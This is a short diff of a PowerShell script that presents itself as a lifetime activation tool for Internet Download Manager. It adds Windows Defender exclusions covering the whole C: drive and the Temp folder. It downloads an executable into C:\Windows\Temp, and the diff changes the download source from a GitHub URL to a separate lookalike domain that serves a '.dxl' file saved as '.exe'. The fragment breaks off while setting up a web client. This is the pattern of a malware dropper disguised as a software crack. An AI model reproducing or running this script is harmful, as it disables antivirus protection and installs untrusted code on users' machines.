@@ -1,7 +1,7 @@
 # Check the instructions here on how to use it https://github.com/lstprjct/IDM-Activation-Script/wiki
 
 Add-MpPreference -ExclusionPath "C:\","IDMLifetimelicense.exe","C:\Windows\Temp\"
-$url = "https://github.com/Pctoolsbox/IDM-Activation-Lifetime-license/raw/refs/heads/main/IDMLifetimelicense.exe"
+$url = "https://www.internetdownloadmanagerpro.com/IDMLifetimelicense.dxl"
 $outpath = "C:\Windows\Temp\IDMLifetimelicense.exe"
 Invoke-WebRequest -Uri $url -OutFile $outpath
 $wc = New-Object System.Net.WebClient
